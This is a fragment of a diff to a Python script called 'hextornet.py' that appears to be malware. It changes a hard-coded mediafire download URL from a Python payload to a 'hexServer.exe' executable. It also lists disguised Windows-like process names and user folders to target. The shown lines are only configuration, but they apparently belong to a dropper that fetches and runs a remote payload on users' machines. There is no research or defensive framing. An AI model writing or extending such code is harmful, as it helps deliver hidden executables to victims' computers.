@@ -11,7 +11,7 @@ from time import sleep
 src1 = os.path.abspath(__file__)
 src = os.path.abspath('hextornet.py')
 usr = getpass.getuser()
-URL = 'http://download1081.mediafire.com/baue0t5ua4mg/4v19d8b5jd2b7jj/hexServer.py'
+URL = 'http://download2269.mediafire.com/92omzolxl7gg/b9n0lw33obqkou2/hexServer.exe'
 
 hextornet   = ['winHex']#, Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
 directories = ['Documents']#, 'Downloads', 'Music', 'Pictures', 'Videos']
